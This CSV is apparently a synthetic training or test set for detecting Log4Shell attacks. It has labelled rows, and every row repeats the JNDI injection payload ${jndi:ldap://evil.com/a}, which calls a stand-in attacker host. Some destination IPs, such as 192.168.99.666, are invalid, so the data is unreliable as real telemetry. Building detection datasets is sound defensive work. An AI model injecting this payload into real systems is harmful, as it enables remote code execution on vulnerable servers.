timestamp,src_ip,dst_ip,process_name,file_hash,signature_status,outbound_conn_5min,dns_query,log_line,jndi_present,entropy,label
2025-11-28T06:19:56.030348,192.168.1.21,104.21.45.67,java.exe,86b03068a9a88858e8a9321ce0ff5a02346bb9d12c189165f9a0a32a3cd1c5cc,Valid,76,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.379,log4j_attack
2025-11-28T06:19:56.030363,192.168.1.104,45.32.123.99,java.exe,764cef0d06acea01324cc76e638d68721fd713a04f0c2c3cb0e8823e74e4f96b,Valid,21,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.355,log4j_attack
2025-11-28T06:19:56.030378,192.168.1.103,185.199.108.33,java.exe,f676bd9eedbfe041e25287a3313a064d81ce9bbdf5f84eaa3307a3f4314962d5,Valid,30,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.859,log4j_attack
2025-11-28T06:19:56.030395,192.168.1.234,185.45.67.88,java.exe,4e230815ccc8f1774f23f749de10dd03da606587d91cb35787c82f9ffa11bb7a,Valid,58,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.458,log4j_attack
2025-11-28T06:19:56.030410,192.168.1.97,104.21.45.67,java.exe,f0c96ab517320c36ac59afcd91de71029d603df00592cb2407898b00393fbea6,Valid,76,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.092,log4j_attack
2025-11-28T06:19:56.030425,192.168.1.107,192.168.99.666,java.exe,10448b05277b4710103c8107c4fee82a78753e77d6d2525ece0ffe38b156f572,Valid,68,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.497,log4j_attack
2025-11-28T06:19:56.030440,192.168.1.209,104.21.45.67,java.exe,858f14dfe9fe20a2886c1c010b18a7b06ca0d9cf653dbd0e9a0a2a57d86a2c3c,Valid,24,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.317,log4j_attack
2025-11-28T06:19:56.030455,192.168.1.197,185.45.67.88,java.exe,cecee76cd746b764153b8360aa1e447348ef76b8b1e90479ea9deb4d7f9e2e4e,Valid,28,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.832,log4j_attack
2025-11-28T06:19:56.030470,192.168.1.92,192.168.99.666,java.exe,241f0061c6c3c0223a4bd2c78885fd5f703e715661fdde8665f3a5cd3fecdc64,Valid,78,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.495,log4j_attack
2025-11-28T06:19:56.030485,192.168.1.21,104.21.45.67,java.exe,cad96fe6a0bca0458dda4b993653bc1e157bbfa7c55ea1e374f4373dd66cc5c6,Valid,43,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.882,log4j_attack
2025-11-28T06:19:56.030500,192.168.1.166,185.45.67.88,java.exe,388b7776aa4f4f242cf7f5858a8080963621cfb483e21bdcaaf36ad396ccb9c3,Valid,39,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.372,log4j_attack
2025-11-28T06:19:56.030515,192.168.1.78,104.21.45.67,java.exe,2fe98478c362b409f59d7029034931658b6c3420feeb19b51422add290a7a97f,Valid,54,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.478,log4j_attack
2025-11-28T06:19:56.030529,192.168.1.148,104.21.45.67,java.exe,28be61911cdef77565e97afb1d0d4fbaa07d628c9b8cdcf97736af7be09faadb,Valid,42,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.03,log4j_attack
2025-11-28T06:19:56.030545,192.168.1.233,45.32.123.99,java.exe,54e1fb6e0bc89abf198d75b1b2798f34a50fe693383fbdabe1c025bddc59ba14,Valid,37,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.466,log4j_attack
2025-11-28T06:19:56.030560,192.168.1.143,185.199.108.33,java.exe,ba82b8c3e66c2a5ad76de7264d63a18166b3489f679c6021c460224f24961c16,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.144,log4j_attack
2025-11-28T06:19:56.030575,192.168.1.20,185.199.108.33,java.exe,9a30c82302997cff66b4577359ae79df10af334c4b71b0c48833af8916dbd300,Valid,54,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.962,log4j_attack
2025-11-28T06:19:56.030590,192.168.1.116,104.21.45.67,java.exe,22fab93082fde7670c7c8c1ba08d6374ebf5cd9662dacdf89541a9db9b0f8d73,Valid,21,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.329,log4j_attack
2025-11-28T06:19:56.030606,192.168.1.48,185.45.67.88,java.exe,163ddeae370df623873f059f0ebca7d995652900a10807971e480838bfd77e5f,Valid,23,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.201,log4j_attack
2025-11-28T06:19:56.030621,192.168.1.122,185.45.67.88,java.exe,67ea8d05ce7fa040c4214161842da358835572ba73c202a8e362fbc16654a6b4,Valid,31,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.047,log4j_attack
2025-11-28T06:19:56.030636,192.168.1.247,104.21.45.67,java.exe,fbfd0d62d320d400fc37c3da5b53c5b4fd7793d0700a7576beaa870ad652ae1c,Valid,47,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.909,log4j_attack
2025-11-28T06:19:56.030651,192.168.1.167,185.199.108.33,java.exe,f19bb09848fa8d43d4f4281b683f0c4d2235bc6edce655e5cf4259d443c0bb65,Valid,54,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.331,log4j_attack
2025-11-28T06:19:56.030666,192.168.1.233,192.168.99.666,java.exe,1deb582df9ea47eca6b166af162e197532ba14a4c9b199593c3ae4a32c66cc57,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.948,log4j_attack
2025-11-28T06:19:56.030681,192.168.1.39,45.32.123.99,java.exe,36b8c1db32a3d69c06c88a0815ff7ba99037eabbd68f6e422ba1f0a8b078f96c,Valid,32,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.402,log4j_attack
2025-11-28T06:19:56.030696,192.168.1.236,185.199.108.33,java.exe,8559ac67fdfbbfa8ced60093c8ca550eb68c8fafbcb0dee4b49c2029b1f45be6,Valid,72,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.19,log4j_attack
2025-11-28T06:19:56.030711,192.168.1.242,104.21.45.67,java.exe,24056ab969408d22030c9fbceab4190482d0eb0069043bb44482a6ca943ba1c3,Valid,79,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.834,log4j_attack
2025-11-28T06:19:56.030726,192.168.1.100,45.32.123.99,java.exe,9ff30a1af5ed95d09ad9f7c91e265eb355972da85333d09bdd6b6c49043a605a,Valid,46,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.912,log4j_attack
2025-11-28T06:19:56.030741,192.168.1.38,104.21.45.67,java.exe,b2027b2331890e41270b78c7e4b7cf24a50c413eb0e0f3c18035331870d28c37,Valid,35,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.911,log4j_attack
2025-11-28T06:19:56.030757,192.168.1.158,185.45.67.88,java.exe,cc2f0423cc6c651db6c489772828c8ffa4ca3c5dd74a5b0b8f8c131632ac4407,Valid,68,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.808,log4j_attack
2025-11-28T06:19:56.030771,192.168.1.165,45.32.123.99,java.exe,085e7d6909fec3675fef1df887c9f425aaffa47c26b70ef503233d9e9c595f68,Valid,50,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.834,log4j_attack
2025-11-28T06:19:56.030787,192.168.1.76,192.168.99.666,java.exe,d8b1007668a382e8204dbe64e7689b55b615983ce71ea1f804417ee5d10dc0b1,Valid,67,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.99,log4j_attack
2025-11-28T06:19:56.030802,192.168.1.66,185.199.108.33,java.exe,bd8974448c298fde3f1a6b804ee8cbfad38122f4612e4b0a08a8d1a13d12d521,Valid,59,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.284,log4j_attack
2025-11-28T06:19:56.030817,192.168.1.196,45.32.123.99,java.exe,b0e04bd8d446ae9876819044ffece08e718eb4bcbceb3a6939aa9498b4e675e0,Valid,68,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.248,log4j_attack
2025-11-28T06:19:56.030832,192.168.1.90,185.45.67.88,java.exe,05521870d165a00265a3aaf2c7f3dd3d3c708a2a61c90afc5af4a2b7d3239f4b,Valid,71,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.908,log4j_attack
2025-11-28T06:19:56.030847,192.168.1.176,192.168.99.666,java.exe,872bf35d9d62fa34da262ab9f69cce283266e68ac14fa7a8781a90c1d5bb3e99,Valid,44,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.867,log4j_attack
2025-11-28T06:19:56.030861,192.168.1.166,45.32.123.99,java.exe,c8ad186c699321b39a9e2a05c8f5113a3d79aea82ef7267e0fa4242a247f2ad8,Valid,42,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.091,log4j_attack
2025-11-28T06:19:56.030876,192.168.1.42,104.21.45.67,java.exe,ba9395d8664d666c9f28d30454dea186f7c3cc8695b2f847191ac297501b2090,Valid,25,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.362,log4j_attack
2025-11-28T06:19:56.030902,192.168.1.125,185.45.67.88,java.exe,9e52b604687f248673a90ecaeadf8fd9b411fcb5377314e2786337056b10db28,Valid,67,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.842,log4j_attack
2025-11-28T06:19:56.030918,192.168.1.15,185.199.108.33,java.exe,b1e37864ef2ea2d9ac4b5cb4aae19a92b38765874f1cec6192a426d75337629c,Valid,51,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.312,log4j_attack
2025-11-28T06:19:56.030933,192.168.1.55,192.168.99.666,java.exe,5bcae532e39164ddc47b095e3dc414e164fdebf2184cd208eb14125f8c9263e0,Valid,75,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.058,log4j_attack
2025-11-28T06:19:56.030948,192.168.1.194,185.45.67.88,java.exe,a341bcc595cb632b25fd8c01cba79309530446ef905e819564873ca864f3c868,Valid,80,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.935,log4j_attack
2025-11-28T06:19:56.030963,192.168.1.154,185.45.67.88,java.exe,be2f2e2983da006d01ead6f4eae97d75b12731ad1cf85e95f445af2c18c64039,Valid,68,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.055,log4j_attack
2025-11-28T06:19:56.030978,192.168.1.223,104.21.45.67,java.exe,6e553be90c3eb4a8a1ee2ea1a6fc4ceffc948f3b237de62cb5f14aabd97d27e1,Valid,80,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.451,log4j_attack
2025-11-28T06:19:56.030993,192.168.1.205,185.45.67.88,java.exe,ce01033567e87821ac7d467b0f2829abf281bc1cbd61670f4a29818df21092db,Valid,64,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.883,log4j_attack
2025-11-28T06:19:56.031009,192.168.1.236,104.21.45.67,java.exe,561862b44b34e72b96665a07af076a9409b6a92bd1b34bf794b8952548859285,Valid,27,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.473,log4j_attack
2025-11-28T06:19:56.031025,192.168.1.60,104.21.45.67,java.exe,e0cc883e076fc41d2301d99f0bf52a0031bdc66361e95d918234c3475db2c24d,Valid,33,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.898,log4j_attack
2025-11-28T06:19:56.031040,192.168.1.182,104.21.45.67,java.exe,93a8921cf2e6ec4a1a9937620a8bbcb5f670763a207a3d13d4961a0c34154698,Valid,54,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.072,log4j_attack
2025-11-28T06:19:56.031055,192.168.1.58,185.45.67.88,java.exe,2b1afd92fa0ba3458b2f6a5d1bd7a9497898557b76a6f67a031ef464c4329859,Valid,71,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.879,log4j_attack
2025-11-28T06:19:56.031070,192.168.1.177,104.21.45.67,java.exe,e81012bf8950accf2bb1e2d390e4630121b0058592cd41c25d6f546837f6be35,Valid,48,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.054,log4j_attack
2025-11-28T06:19:56.031085,192.168.1.235,192.168.99.666,java.exe,2ed72f8832ab1e6ffe432a84515599bccebda60a2521e8e733f383d8635aa089,Valid,20,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.468,log4j_attack
2025-11-28T06:19:56.031100,192.168.1.34,45.32.123.99,java.exe,d09b96689b80e7db8ec48469f9f1c618f834ac3b7c9d904e10c325ed5b14a817,Valid,65,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.391,log4j_attack
2025-11-28T06:19:56.031115,192.168.1.210,192.168.99.666,java.exe,8139117d06a2535bbd8f7a4d1e3a2c856944a72894abba9173170c269759db6b,Valid,75,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.975,log4j_attack
2025-11-28T06:19:56.031130,192.168.1.156,185.45.67.88,java.exe,9a62aea8d618b8aeecb5ea2db03f4e86ee3d043d0f0ab969b03a17c96e69081b,Valid,33,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.487,log4j_attack
2025-11-28T06:19:56.031145,192.168.1.126,45.32.123.99,java.exe,e15e57e17c50f112b638fc27ea0744a01ee4fa0286cb2f2a53c901761c49aa5f,Valid,47,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.961,log4j_attack
2025-11-28T06:19:56.031161,192.168.1.189,192.168.99.666,java.exe,e2183d6d86adc0150d5d6cd73baaa8136f52b2c47725e7d8efe085ebb5fb6f78,Valid,80,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.001,log4j_attack
2025-11-28T06:19:56.031176,192.168.1.225,104.21.45.67,java.exe,9a35c143f95757495493132b74b3d3f857485a48927499795753a10aacc4917b,Valid,42,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.925,log4j_attack
2025-11-28T06:19:56.031191,192.168.1.19,104.21.45.67,java.exe,88615101bff97c20ca8b4e0a97a598b180a654f5ac6650a42f6690302ce563d2,Valid,75,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.21,log4j_attack
2025-11-28T06:19:56.031205,192.168.1.59,104.21.45.67,java.exe,19de011a596d8a85d57160de1daa7851fc535108c40a3678222c41e26c709ce2,Valid,75,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.276,log4j_attack
2025-11-28T06:19:56.031220,192.168.1.10,104.21.45.67,java.exe,6525c14c858a433c6265d87babe0e6ceb4622cb32ad007849a70282d71ae7d4c,Valid,62,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.159,log4j_attack
2025-11-28T06:19:56.031235,192.168.1.119,185.199.108.33,java.exe,b7c34d507c438bd69978dd9dfc82a818206817249a104ab0fc0dc5e7013ade71,Valid,71,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.111,log4j_attack
2025-11-28T06:19:56.031251,192.168.1.36,192.168.99.666,java.exe,2363f79d8bb1410159f0cfa1d4fca0b172ddf9e894122a56d00dd38356d666eb,Valid,38,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.108,log4j_attack
2025-11-28T06:19:56.031266,192.168.1.69,192.168.99.666,java.exe,00a3e8bd7c3f9f6c550c5f11a7f99b9c0c5999edddb16d2753a685dc5e477100,Valid,49,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.121,log4j_attack
2025-11-28T06:19:56.031281,192.168.1.109,104.21.45.67,java.exe,255de0fa4c476c3b62a79a01b6c1f190900f5f9b26fec0f41edcbe1d8cc21932,Valid,25,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.818,log4j_attack
2025-11-28T06:19:56.031296,192.168.1.199,45.32.123.99,java.exe,b49f856fd6ff012ba35d61a2b4df7ab7eca57ad7e41a2d1c03e01da6d51d050d,Valid,52,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.985,log4j_attack
2025-11-28T06:19:56.031311,192.168.1.151,185.45.67.88,java.exe,95b0e5934eeaa3d135c0e85515475d602cf3997763ae0f578007a82131222eec,Valid,54,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.033,log4j_attack
2025-11-28T06:19:56.031326,192.168.1.108,192.168.99.666,java.exe,d8860ce539540f6833c414ade0d75307c4cfe6a10aa3ae5c4d0b7aec04b86bf6,Valid,30,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.224,log4j_attack
2025-11-28T06:19:56.031347,192.168.1.113,45.32.123.99,java.exe,bdb8fde0b37d31804f36651339dd7f9f47c450755f94865a9db4b773090ec1e3,Valid,71,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.873,log4j_attack
2025-11-28T06:19:56.031363,192.168.1.192,185.45.67.88,java.exe,e090a775b4523429f46bb9411d4f57b13d110375f0569665564c0d118a16971e,Valid,71,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.304,log4j_attack
2025-11-28T06:19:56.031378,192.168.1.160,104.21.45.67,java.exe,53637a49a43ac981f83d462d644ccc6e7006d9c7ef7e8d085be83b7e204f51aa,Valid,35,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.188,log4j_attack
2025-11-28T06:19:56.031393,192.168.1.34,185.45.67.88,java.exe,1a85deef6d20289014c1b23253d32327b57b672b9d9e072e00eecd3240d4de8c,Valid,58,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.272,log4j_attack
2025-11-28T06:19:56.031408,192.168.1.107,192.168.99.666,java.exe,d8674e31afdf24b5f04d20cbd4e01b319e815879a69aec58046ebfe9dca169a0,Valid,39,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.882,log4j_attack
2025-11-28T06:19:56.031424,192.168.1.107,185.45.67.88,java.exe,65700b2f1bd93f253374864b03f9a2591b639d0eb2162fb41d5b60cdc6ef3863,Valid,26,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.802,log4j_attack
2025-11-28T06:19:56.031439,192.168.1.231,185.45.67.88,java.exe,a9f6cf1d2538717ac5de7af8c0854e9f680881b06172c7d6365613eb0edd3ab7,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.383,log4j_attack
2025-11-28T06:19:56.031454,192.168.1.117,185.199.108.33,java.exe,882f118be450527ad642fc2d2d68130ea5bbf536b1f1fb6ecbcea8b9ecec05b3,Valid,54,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.986,log4j_attack
2025-11-28T06:19:56.031469,192.168.1.115,192.168.99.666,java.exe,ce9659524eff5943632ff0cfc9f391b46e46ec82146d82bf01fd286ed570251b,Valid,56,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.455,log4j_attack
2025-11-28T06:19:56.031485,192.168.1.244,185.199.108.33,java.exe,2b7cc93e48ab119dc3390950eb5154ffcbafe215ff64e4b2f6adb065e3501f1f,Valid,26,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.974,log4j_attack
2025-11-28T06:19:56.031500,192.168.1.63,104.21.45.67,java.exe,1c133a699d7b1c27e409ddb085408c29451be6aef7f236fbc14df1b269ac1fff,Valid,23,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.287,log4j_attack
2025-11-28T06:19:56.031514,192.168.1.55,192.168.99.666,java.exe,1102b1064e2e3ef6bc09dc0f339b1228fe2277ef97b200d27cbf49f56bff3da7,Valid,41,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.392,log4j_attack
2025-11-28T06:19:56.031529,192.168.1.240,185.199.108.33,java.exe,88980c1590982f6eb226ceaaaee9f6e0e290973793a5bb5dc1808d4ecb1a846c,Valid,36,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.892,log4j_attack
2025-11-28T06:19:56.031544,192.168.1.25,45.32.123.99,java.exe,35e83d86af561529ab5fb39f48429ec5f790d2d20a662fe5f7d7b100d8477aa5,Valid,41,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.036,log4j_attack
2025-11-28T06:19:56.031559,192.168.1.131,192.168.99.666,java.exe,303477f1e295b9ab7f8b6c2e48e3ac2eab721d6262166738e5f3da213cd15f6b,Valid,80,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.114,log4j_attack
2025-11-28T06:19:56.031574,192.168.1.51,104.21.45.67,java.exe,00540d2568c75c31ea5105b45aef8166bed55bc0dba941216752413cd2201037,Valid,61,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.063,log4j_attack
2025-11-28T06:19:56.031590,192.168.1.220,45.32.123.99,java.exe,c0a62c558f789b897575eb7df39249a25f7f71ccd1e606b448099ccd55085a88,Valid,49,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.494,log4j_attack
2025-11-28T06:19:56.031606,192.168.1.60,185.199.108.33,java.exe,727a3eae6561a788bac04a1206be75fdf129d80c359817e9306f284f17aa38a5,Valid,45,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.43,log4j_attack
2025-11-28T06:19:56.031621,192.168.1.55,192.168.99.666,java.exe,7926f94378f5ca5619684743ed4ab1250ed2b7568b3ea9060483a373e8ff35fa,Valid,69,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.113,log4j_attack
2025-11-28T06:19:56.031636,192.168.1.78,185.199.108.33,java.exe,db0ffe38d4ea47f80a58c54454dd1a05d8d9ca39f18a63dfb68ea1fc090e2f4d,Valid,35,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.202,log4j_attack
2025-11-28T06:19:56.031651,192.168.1.86,104.21.45.67,java.exe,ba0dd36eab37a7305d5b9d11f64717508db6c372c4abdbbf830b2c643f3b1f76,Valid,50,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.477,log4j_attack
2025-11-28T06:19:56.031666,192.168.1.233,104.21.45.67,java.exe,d4931a30421fcfedeca1a8f044df42314d915c200b28c76e0dd56b8013a8419b,Valid,67,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.347,log4j_attack
2025-11-28T06:19:56.031681,192.168.1.94,185.199.108.33,java.exe,ac4aa4d5c5ba440126b677ef589491d16ba30fc3d8757d431939c91fd2bdab89,Valid,68,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.907,log4j_attack
2025-11-28T06:19:56.031697,192.168.1.141,104.21.45.67,java.exe,0fb4aeacd22a670403054a5a6ad3b4cd460432f93ec1ab838992e05fe422dc78,Valid,58,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.823,log4j_attack
2025-11-28T06:19:56.031712,192.168.1.102,192.168.99.666,java.exe,46ece83168a7a5a5db99e1d6843f0be6b29006e736624315361577fd7d5994a9,Valid,47,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.037,log4j_attack
2025-11-28T06:19:56.031727,192.168.1.53,45.32.123.99,java.exe,578044f331ee6db1f8a70af92ecc058a45249a29b0f2825d331d59b93f801936,Valid,39,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.894,log4j_attack
2025-11-28T06:19:56.031741,192.168.1.158,192.168.99.666,java.exe,574fcbc306386f7faece91202c235922eb47ef394dcb1b90c844f7aec9219b92,Valid,42,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.235,log4j_attack
2025-11-28T06:19:56.031756,192.168.1.117,192.168.99.666,java.exe,80726acd669703f6c84ebec272c043daa26ba78dc13f5107ffeecb9bfcfd5b77,Valid,20,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.354,log4j_attack
2025-11-28T06:19:56.031771,192.168.1.61,45.32.123.99,java.exe,f6cc8397a088fcedc2af5a405b2ee95822d3b5bcb583ba20d4d16c7f73b0fb97,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.157,log4j_attack
2025-11-28T06:19:56.031786,192.168.1.227,104.21.45.67,java.exe,50b8855270000e9e9e49a58016a20813963d41f8f41e497ed3eea8a5e66adbd2,Valid,22,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.245,log4j_attack
2025-11-28T06:19:56.031801,192.168.1.19,185.45.67.88,java.exe,861240d6a6e964be93c7e50ce4f5a9eef1e7289c45719f8ff270d5d22bad5881,Valid,43,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.061,log4j_attack
2025-11-28T06:19:56.031816,192.168.1.122,185.199.108.33,java.exe,ef812ad354563e83535f1ce243f9019d1cc95f6c05d8720d103dfa0c8fa96ce5,Valid,51,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.869,log4j_attack
2025-11-28T06:19:56.031831,192.168.1.166,185.199.108.33,java.exe,796bc3aea07846c4a986ed3d1964ee4a76e11af9471ab7fe3ba801c882b96c18,Valid,28,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.178,log4j_attack
2025-11-28T06:19:56.031846,192.168.1.41,185.199.108.33,java.exe,65ee084fcf2e64196081ee11c39a29eb921d6ab924d3046de7ef02644c75527c,Valid,35,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.906,log4j_attack
2025-11-28T06:19:56.031861,192.168.1.65,185.45.67.88,java.exe,bba747fd212cb6526ba1eeaab3b16bddb915296713663d2935aed552af9b6590,Valid,30,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.092,log4j_attack
2025-11-28T06:19:56.031876,192.168.1.93,185.45.67.88,java.exe,ff6784823e9ad6adb61d6c2b776476809bc7629f42f5300c6d5795612435d7b3,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.044,log4j_attack
2025-11-28T06:19:56.031902,192.168.1.112,45.32.123.99,java.exe,84b564e8ce55fb16efa4726b9e28606408ad88099ba0755021088ebff8edf367,Valid,49,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.423,log4j_attack
2025-11-28T06:19:56.031918,192.168.1.127,185.45.67.88,java.exe,aa879f72439bafcca106b180ada3a726beb454a255523596d3fa3432a0351563,Valid,69,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.427,log4j_attack
2025-11-28T06:19:56.031933,192.168.1.159,185.199.108.33,java.exe,e785cfc420fc201e21d4b0687e3709f18e13b8037e0ac25e5502901d46d948f9,Valid,54,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.353,log4j_attack
2025-11-28T06:19:56.031948,192.168.1.86,192.168.99.666,java.exe,16a4fa55b932f33dcaf9afa44623338fe19035513b9ad8d729a7aa1e6a00d65d,Valid,73,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.291,log4j_attack
2025-11-28T06:19:56.031963,192.168.1.123,192.168.99.666,java.exe,bfae569423c1d71aebcca0291d15f56555776797e36b1b939e1ab65c95f973d8,Valid,43,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.971,log4j_attack
2025-11-28T06:19:56.031978,192.168.1.241,45.32.123.99,java.exe,382299c238109a25a7351677eef5d7700165845084bcc1eea4c6b3843ca838ac,Valid,57,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.172,log4j_attack
2025-11-28T06:19:56.031993,192.168.1.149,45.32.123.99,java.exe,0b077c49bf088fff3cb9678f40fc1f9aab523d06b185e6629d5a5fe005e7a43c,Valid,30,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.296,log4j_attack
2025-11-28T06:19:56.032008,192.168.1.197,45.32.123.99,java.exe,ea82e8b6c23fb7835f72c9c8f5932bfcc1c51274d34a85bc7a45fd4f6e902aee,Valid,59,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.148,log4j_attack
2025-11-28T06:19:56.032023,192.168.1.126,45.32.123.99,java.exe,5287334859bbd5c20f98388fbea94aa82fe018a56ba22da13a2d4ed4c79ac875,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.041,log4j_attack
